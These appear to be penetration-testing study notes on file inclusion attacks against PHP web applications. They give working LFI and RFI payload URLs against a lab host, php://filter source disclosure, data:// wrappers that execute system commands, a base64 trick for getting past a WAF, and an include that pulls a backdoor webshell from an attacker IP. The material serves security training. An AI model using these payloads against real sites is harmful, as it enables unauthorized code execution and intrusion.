# LFI
1. Find out which server-side scripting language is used (e.g. php, jsp)
2. Write (webshell) code to a file on the server (e.g. using log poisoning)
3. Include the file using LFI vulnerability
4. Gain remote shell via webshell

Note that we can also find LFI vulnerabilities in modern back-end JavaScript runtime environments like Node.js

## PHP wrappers

### `php://filter`
- display the contents of executable files (such as .php) instead of executing them
- e.g. `http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`
	- Decode output with `echo "output" | base64 -d`

### `data://`
- embed data elements as plaintext or base64-encoded data in the running web application’s code (useful for when we cannot poison a local file)
- e.g. `http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>`
- To bypass WAF, may encode payload in b64
	- `echo -n '<?php%20echo%20system('ls');?>' | base64` (replace `%20` with space)
	- `"http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,[insert-above-output]&cmd=ls`
- Note: this wrapper does not work in a default PHP installation. The *allow_url_include* option needs to be enabled.

# RFI
Note: The *allow_url_include* option needs to be enabled for RFI. (It is disabled by default.)

RFI: Include files from a remote system over HTTP or SMB, then executed in the context of the web application.

Webshells in `/usr/share/webshells/` directory in Kali can be used.

Example:
- `http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls`

